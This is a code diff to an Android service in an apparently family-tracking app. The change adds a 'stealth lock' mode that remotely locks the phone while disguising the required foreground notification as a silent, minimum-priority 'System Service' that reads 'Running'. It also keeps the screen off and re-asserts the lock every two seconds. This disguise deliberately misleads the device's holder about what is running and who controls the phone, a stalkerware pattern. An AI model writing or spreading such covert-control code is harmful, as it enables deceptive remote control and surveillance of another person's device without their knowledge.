@@ -25,12 +25,28 @@ class DeviceLockService : Service() {
         private const val NOTIFICATION_ID = 1008
         
         private var isRunning = false
+        private var isStealthMode = false
         
         fun startLock(context: Context) {
             if (isRunning) return
             
+            isStealthMode = false
             val intent = Intent(context, DeviceLockService::class.java)
             intent.action = "START_LOCK"
+            try {
+                context.startForegroundService(intent)
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to start foreground service", e)
+                context.startService(intent)
+            }
+        }
+        
+        fun startStealthLock(context: Context) {
+            if (isRunning) return
+            
+            isStealthMode = true
+            val intent = Intent(context, DeviceLockService::class.java)
+            intent.action = "START_STEALTH_LOCK"
             try {
                 context.startForegroundService(intent)
             } catch (e: Exception) {
@@ -46,6 +62,7 @@ class DeviceLockService : Service() {
         }
         
         fun isLockActive(): Boolean = isRunning
+        fun isInStealthMode(): Boolean = isStealthMode
     }
     
     private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
@@ -60,8 +77,13 @@ class DeviceLockService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         when (intent?.action) {
             "START_LOCK" -> {
-                startForeground(NOTIFICATION_ID, createNotification())
-                startLockMode()
+                startForeground(NOTIFICATION_ID, createNotification(false))
+                startLockMode(false)
+            }
+            "START_STEALTH_LOCK" -> {
+                // Silent notification for stealth mode
+                startForeground(NOTIFICATION_ID, createNotification(true))
+                startLockMode(true)
             }
             "STOP_LOCK" -> {
                 stopLockMode()
@@ -80,18 +102,19 @@ class DeviceLockService : Service() {
         serviceScope.cancel()
     }
     
-    private fun startLockMode() {
+    private fun startLockMode(stealth: Boolean) {
         isRunning = true
-        Log.d(TAG, "Starting lock mode")
+        isStealthMode = stealth
+        Log.d(TAG, "Starting lock mode (stealth=$stealth)")
         
-        // Acquire wake lock to keep device awake
-        acquireWakeLock()
+        // Acquire wake lock to keep device awake (partial only in stealth mode)
+        acquireWakeLock(stealth)
         
         // Launch lock activity
-        DeviceLockActivity.lockDevice(this)
+        DeviceLockActivity.lockDevice(this, stealth)
         
         // Start monitoring to keep lock screen on top
-        startMonitoring()
+        startMonitoring(stealth)
     }
     
     private fun stopLockMode() {
@@ -109,16 +132,23 @@ class DeviceLockService : Service() {
         DeviceLockActivity.unlockDevice(this)
     }
     
-    private fun acquireWakeLock() {
+    private fun acquireWakeLock(stealth: Boolean) {
         try {
             val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            // In stealth mode, only partial wake lock (screen off)
+            // In normal mode, also wake up screen
+            val flags = if (stealth) {
+                PowerManager.PARTIAL_WAKE_LOCK
+            } else {
+                PowerManager.PARTIAL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP
+            }
             wakeLock = powerManager.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                flags,
                 "FamilyTracker:DeviceLock"
             ).apply {
                 acquire(24 * 60 * 60 * 1000L) // 24 hours max
             }
-            Log.d(TAG, "Wake lock acquired")
+            Log.d(TAG, "Wake lock acquired (stealth=$stealth)")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to acquire wake lock", e)
         }
@@ -138,19 +168,19 @@ class DeviceLockService : Service() {
         }
     }
     
-    private fun startMonitoring() {
+    private fun startMonitoring(stealth: Boolean) {
         monitorJob = serviceScope.launch {
             while (isRunning) {
                 // Periodically ensure lock screen is visible
                 if (DeviceLockActivity.isDeviceLocked()) {
-                    DeviceLockActivity.lockDevice(this@DeviceLockService)
+                    DeviceLockActivity.lockDevice(this@DeviceLockService, stealth)
                 }
                 delay(2000) // Check every 2 seconds
             }
         }
     }
     
-    private fun createNotification(): Notification {
+    private fun createNotification(stealth: Boolean): Notification {
         val pendingIntent = PendingIntent.getActivity(
             this,
             0,
@@ -158,15 +188,28 @@ class DeviceLockService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        return NotificationCompat.Builder(this, FamilyTrackerApp.CHANNEL_ID)
-            .setContentTitle("Device Locked")
-            .setContentText("Device is remotely locked")
-            .setSmallIcon(R.drawable.ic_location)
-            .setContentIntent(pendingIntent)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setCategory(NotificationCompat.CATEGORY_ALARM)
-            .build()
+        return if (stealth) {
+            // Silent/hidden notification for stealth mode
+            NotificationCompat.Builder(this, FamilyTrackerApp.CHANNEL_ID)
+                .setContentTitle("System Service")
+                .setContentText("Running")
+                .setSmallIcon(R.drawable.ic_location)
+                .setContentIntent(pendingIntent)
+                .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setSilent(true)
+                .build()
+        } else {
+            NotificationCompat.Builder(this, FamilyTrackerApp.CHANNEL_ID)
+                .setContentTitle("Device Locked")
+                .setContentText("Device is remotely locked")
+                .setSmallIcon(R.drawable.ic_location)
+                .setContentIntent(pendingIntent)
+                .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_MAX)
+                .setCategory(NotificationCompat.CATEGORY_ALARM)
+                .build()
+        }
     }
     
     override fun onTaskRemoved(rootIntent: Intent?) {
